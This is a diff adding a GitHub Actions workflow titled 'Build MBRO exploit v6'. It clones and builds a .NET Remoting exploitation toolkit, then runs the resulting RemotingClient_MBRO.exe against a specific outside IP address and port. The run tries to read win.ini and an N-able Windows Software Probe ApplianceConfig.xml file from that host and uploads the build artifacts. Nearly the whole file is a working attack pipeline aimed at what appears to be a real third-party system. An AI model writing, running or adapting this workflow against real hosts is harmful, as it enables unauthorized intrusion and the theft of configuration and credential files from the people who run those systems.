@@ -1,0 +1,58 @@
+name: Build MBRO exploit v6
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Clone and retarget ALL projects
+        run: |
+          git clone https://github.com/securifera/NewRemotingTricks C:\exploit
+          
+          # Retarget ALL csproj files from 4.5 to 4.8
+          Get-ChildItem -Path C:\exploit -Recurse -Filter "*.csproj" | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw
+            $updated = $content -replace 'v4\.5', 'v4.8'
+            if ($content -ne $updated) {
+              Set-Content -Path $_.FullName -Value $updated
+              Write-Host "Retargeted: $($_.Name)"
+            }
+          }
+
+      - name: Build solution
+        run: |
+          $vs = & "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe 2>$null | Select-Object -First 1
+          
+          # Find solution file
+          $sln = Get-ChildItem -Path C:\exploit -Filter "*.sln" | Select-Object -First 1
+          Write-Host "Solution: $($sln.FullName)"
+          
+          & $vs $sln.FullName /p:Configuration=Release /verbosity:minimal 2>&1 | Select-Object -Last 20
+          
+          Write-Host "=== All built executables ==="
+          Get-ChildItem -Path C:\exploit -Recurse -Filter "*.exe" | Where-Object { $_.FullName -match "Release" } | Select FullName
+
+      - name: Run exploit against target
+        run: |
+          $exe = Get-ChildItem -Path C:\exploit -Recurse -Filter "RemotingClient_MBRO.exe" | 
+                 Where-Object { $_.FullName -match "Release" } | Select-Object -First 1
+          if ($exe) {
+            Write-Host "=== Exploit binary: $($exe.FullName) ==="
+            Write-Host "=== Attempting file read from 138.207.64.28:10004/ProofOfConcept ==="
+            Write-Host "=== URI: file:///C:/Windows/win.ini ==="
+            & $exe.FullName tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/win.ini" 2>&1
+            Write-Host "=== Exit code: $LASTEXITCODE ==="
+            
+            Write-Host ""
+            Write-Host "=== Attempting ApplianceConfig.xml read ==="
+            & $exe.FullName tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/ProgramData/N-able%20Technologies/Windows%20Software%20Probe/config/ApplianceConfig.xml" 2>&1
+          } else {
+            Write-Host "Build failed - no exe found"
+            Get-ChildItem -Path C:\exploit -Recurse -Filter "*.exe" | Select FullName
+          }
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mbro-v6
+          path: C:\exploit\**\Release\**
